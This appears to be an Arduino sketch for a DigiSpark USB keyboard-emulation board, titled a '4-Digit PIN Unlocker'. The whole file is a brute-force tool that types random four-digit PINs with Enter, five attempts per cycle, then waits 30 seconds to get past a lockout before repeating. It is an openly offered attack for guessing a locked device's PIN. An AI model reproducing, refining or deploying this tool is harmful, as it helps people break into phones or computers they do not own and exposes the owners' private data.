#include <DigiKeyboard.h>


// 4-Digit PIN Unlocker -- @arunsanjeevms-- //

void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0); 
}

void loop() {
  static int attempts = 0;

  while (attempts < 5) {
    randomSeed(millis());
    char pinStr[5]; 
    for (int i = 0; i < 4; i++) {
      pinStr[i] = random(10) + '0'; 
    }
    pinStr[4] = '\0'; // Null terminator
    DigiKeyboard.print(pinStr); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(2000); 
    attempts++;
  }

  attempts = 0; // Reset attempts counter
  DigiKeyboard.delay(30000); // 30 Secs Delay
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
